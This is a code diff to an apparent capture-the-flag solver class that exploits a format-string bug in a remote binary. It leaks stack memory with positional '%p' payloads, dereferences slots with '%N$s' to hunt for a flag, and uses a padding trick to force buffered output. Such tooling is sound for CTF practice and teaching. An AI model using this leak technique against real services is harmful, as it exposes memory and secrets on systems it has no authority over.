@@ -53,57 +53,80 @@ class CipherFormatString(Strategy):
         flag_re = ctx.flag_re
         pat = re.compile(flag_re.encode() if isinstance(flag_re, str) else flag_re)
 
-        def leak(ascii_payload):
-            """Fresh connection per payload so a bad deref can't kill a scan."""
+        # Wrap the real output in markers so we can find it no matter what else
+        # the service sends: a banner, or our own input echoed back by a PTY.
+        # A trailing positional %c with a huge width forces a flush when the
+        # remote's stdout is fully buffered (this binary has no setvbuf). Keeping
+        # every conversion positional satisfies glibc's all-or-nothing $ rule.
+        ML, MR, PAD = "SCR[", "]RCS", "%1$9000c"
+        marker = re.compile(re.escape(ML.encode()) + b"(.*?)" + re.escape(MR.encode()),
+                            re.S)
+        self._saw_bytes = False
+
+        def ask(body):
+            """Send one positional format string, return the bytes it emitted
+            between the markers (or None). Fresh connection each time so a bad
+            %s deref can't kill the rest of the scan."""
             try:
                 conn = connect(ctx.binary.path, target)
             except Exception as e:
                 report.warn(f"connect failed: {e}")
-                return b""
+                return None
             try:
-                conn.sendline(emojify(ascii_payload))
-                return conn.recvline(timeout=4)
+                conn.sendline(emojify(ML + body + MR + PAD))
+                blob = conn.recvrepeat(1.2)      # grab everything, not one line
             except Exception:
-                return b""
+                blob = b""
             finally:
                 try:
                     conn.close()
                 except Exception:
                     pass
+            if blob:
+                self._saw_bytes = True
+            m = marker.search(blob)
+            return m.group(1) if m else None
 
         # ---- 1) %p stack dump (safe: never dereferences) ----
         report.step("Leaking the stack via %p (token-encoded)...")
         slots = {}
         for start in range(1, _MAXOFF + 1, _BATCH):
-            payload = ".".join(f"%{i}$p" for i in range(start, start + _BATCH))
-            out = leak(payload)
-            for j, tok in enumerate(out.split(b".")):
-                tok = tok.strip()
-                if tok.startswith(b"0x"):
-                    try:
-                        slots[start + j] = int(tok, 16).to_bytes(8, "little")
-                    except ValueError:
-                        pass
-            blob = b"".join(slots[k] for k in sorted(slots))
-            m = pat.search(blob)
-            if m:
-                flag = m.group(0).decode(errors="replace")
-                report.ok(f"FLAG (stack leak): {flag}")
-                return flag
+            body = ",".join(f"%{i}$p" for i in range(start, start + _BATCH))
+            got = ask(body)
+            if got:
+                for j, tok in enumerate(got.split(b",")):
+                    tok = tok.strip()
+                    if tok.startswith(b"0x"):
+                        try:
+                            slots[start + j] = int(tok, 16).to_bytes(8, "little")
+                        except ValueError:
+                            pass
+                blob = b"".join(slots[k] for k in sorted(slots))
+                m = pat.search(blob)
+                if m:
+                    flag = m.group(0).decode(errors="replace")
+                    report.ok(f"FLAG (stack leak): {flag}")
+                    return flag
 
         # ---- 2) %N$s scan (dereference each slot as a string) ----
         report.step("No flag on the raw stack; scanning %N$s pointers...")
         for i in range(1, _MAXOFF + 1):
-            out = leak(f"%{i}$s")
-            m = pat.search(out)
-            if m:
-                flag = m.group(0).decode(errors="replace")
-                report.ok(f"FLAG (%{i}$s): {flag}")
-                return flag
+            got = ask(f"%{i}$s")
+            if got:
+                m = pat.search(got)
+                if m:
+                    flag = m.group(0).decode(errors="replace")
+                    report.ok(f"FLAG (%{i}$s): {flag}")
+                    return flag
 
-        report.warn("No flag via format-string leak. Printable stack strings:")
-        for off in sorted(slots):
-            b = slots[off].rstrip(b"\x00")
-            if b and all(0x20 <= c < 0x7f for c in b):
-                report.info(f"  %{off}$p -> {b.decode()!r}")
+        if not self._saw_bytes:
+            report.warn("The remote returned nothing for any payload -- its stdout "
+                        "is likely fully buffered with no flush path. Connect by "
+                        "hand (nc) to confirm what it emits.")
+        else:
+            report.warn("No flag via format-string leak. Printable stack strings:")
+            for off in sorted(slots):
+                b = slots[off].rstrip(b"\x00")
+                if b and all(0x20 <= c < 0x7f for c in b):
+                    report.info(f"  %{off}$p -> {b.decode()!r}")
         return None
